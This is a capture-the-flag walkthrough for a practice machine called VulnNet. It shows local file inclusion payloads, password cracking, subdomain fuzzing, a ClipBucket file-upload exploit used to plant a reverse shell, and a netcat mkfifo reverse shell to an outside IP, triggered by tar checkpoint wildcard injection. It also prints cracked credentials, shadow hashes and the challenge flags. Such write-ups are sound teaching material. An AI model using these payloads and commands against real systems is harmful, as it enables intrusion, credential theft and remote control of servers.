# VULNNET

![](../.gitbook/assets/ccb91cfb209640e2af7ed56459046be9.png)

## NMAP SCAN

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
```

## PORT 80 ENUMERATION

![](../.gitbook/assets/877dc1adacbc4bc28f4341be44e85086.png)

### /LOGIN

![](../.gitbook/assets/31856c5dcaee4543ad12ef02ec4acf45.png)

### IN BURPSUITE I FOUND A POSSIBLE LFI VULN

![](../.gitbook/assets/11df298128e443f09a301fe645fe4cb2.png)

```text
view-source:http://vulnnet.thm/index.php?referer=/etc/passwd
```

![](../.gitbook/assets/995ab71fc77f415b828846cfebbb95be.png)

### .HTACCESS

```text
view-source:http://vulnnet.thm/index.php?referer=/var/www/html/.htaccess
```

```javascript
########## Begin - Rewrite rules to block out some common exploits
#                              
# Block out any script trying to set a mosConfig value through the URL
RewriteCond %{QUERY_STRING} mosConfig_[a-zA-Z_]{1,21}(=|\%3D) [OR]
# Block out any script trying to base64_encode crap to send via URL
RewriteCond %{QUERY_STRING} base64_encode.*\(.*\) [OR]
# Block out any script that includes a <script> tag in URL
RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
# Block out any script trying to set a PHP GLOBALS variable via URL
RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [OR]
# Block out any script trying to modify a _REQUEST variable via URL
RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2})
# Send all blocked request to homepage with 403 Forbidden error!
#RewriteRule ^(.*)$ index.php [L]
RewriteRule ^([^.]*)/?$ index.php [L]
```

### INDEX.PHP

```text
view-source:http://vulnnet.thm/index.php?referer=php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

![](../.gitbook/assets/873201da9f9447d9be61caaebe9d010a.png)

### CONFIG.INC.PHP

```text
view-source:http://vulnnet.thm/index.php?referer=php://filter/convert.base64-encode/resource=/var/www/html/includes/config.inc.php
```

* FROM HERE I WENT TO COMMON.PHP AND SAW THE NAME \(dbconnect.php\)

### DBCONNECT.PHP

```text
view-source:http://vulnnet.thm/index.php?referer=php://filter/convert.base64-encode/resource=/var/www/html/includes/dbconnect.php
```

![](../.gitbook/assets/c070711d4f0f4869b32b70f2b41b1eed.png)

```text
admin:VulnNetAdminPass0990
```

### .HTPASSWD

```text
view-source:http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd
```

```bash
sudo john hash --wordlist=/opt/passwd/rockyou.txt
```

![](../.gitbook/assets/b60cf215958c4e8e80f147dcd1a7eef5.png)

```text
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls
```

* DIDN´T WORK ALSO IN LOGIN PAGE
* AFTER SEEING ALL THE FILES \([https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File Inclusion/Intruders/Linux-files.txt\) AND](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt%29AND) GET NOTHING, I DECIDED TO ENUMERATE SUBDOMAINS \(EVEN WITH 2 CREDS\)

### SUBDOMAINS ENUMERATION

```bash
wfuzz -c -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 5829
```

![](../.gitbook/assets/43945fe098394beb9fa09349179d26b1.png)

* ADD BROADCAST.VULNNET.THM TO YOUR HOSTS

### BROADCAST.VULNET.THM

* DEVELOPERS CREDS WORKED 

![](../.gitbook/assets/af49b929c98448d1a7b166bef36b68e0.png)

* CLIPBUCKET V4.0 

![](../.gitbook/assets/ce51601601474b5fbfed8f716688a81f.png)

![](../.gitbook/assets/b8794dd592a849dfa17024bb40fdf133.png)

### UPLOAD A REVERSE SHELL

```text
https://www.exploit-db.com/exploits/44250
```

```bash
curl -F "file=@revshell.php" -F "plupload=1" -F "name=revshell.php" "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
```

![](../.gitbook/assets/545363223a7246838772a9813c93f049.png)

```text
http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1616297818aecd75.php
```

![](../.gitbook/assets/c6b299876593419d8be4e4abad53f4b8.png)

## MACHINE ENUMERATION

### USERS WITH CONSOLE

```text
root:x:0:0:root:/root:/bin/bash
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
```

### LINPEAS FINDINGS

* CRONJOBS

```text
* * * * root    /var/opt/backupsrv.sh
```

### SSH BACKUP

```text
/var/backups/ssh-backup.tar.gz

ssh2john id_rsa > pass
```

![](../.gitbook/assets/4536e81db667477da4c577a4eefc71ee.png)

```text
oneTWO3gOyac
```

## LOGIN SSH

```text
ssh -i id_rsa server-management@10.10.105.45
```

![](../.gitbook/assets/597a4512d5084f648cf0c2ec3bfb0b5c.png)

## PRIVESC

```text
/var/opt/backupsrv.sh
```

![](../.gitbook/assets/c2094c069e28473c87cf1375026d21aa.png)

```text
https://gtfobins.github.io/gtfobins/tar/#sudo
```

![](../.gitbook/assets/a21fe1e60fa9463c918722ca1f00c215.png)

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.214.87 9999 >/tmp/f" > shell.sh

echo "" > "--checkpoint-action=exec=bash shell.sh"

echo "" > --checkpoint=1
```

![](../.gitbook/assets/4c516f0817554d1592323881b73b3418.png)

## HASHES

```text
root:$6$7ZUB5Wuw$rl8t6KolOI2YKOYE2e3z7gFYwlbjVUrkOXZG6MMIDDPehoiAKjN9WslMqx/w19GgvLVTwCXyoSTrm4ogQmgAg.:18650:0:99999:7:::
server-management:$6$5lxo385N$kMG/mtf4fGqP9I8iPPHwwHJJj4JFMkrfI1DuaHHYlEuo9Ymveeq12boUKlw/4zBi.i8Y6RUh93QZthCjuagBB0:18650:0:99999:7:::
```

## FLAGS

### USER

```text
THM{907e420d979d8e2992f3d7e16bee1e8b}
```

### ROOT

```text
THM{220b671dd8adc301b34c2738ee8295ba}
```

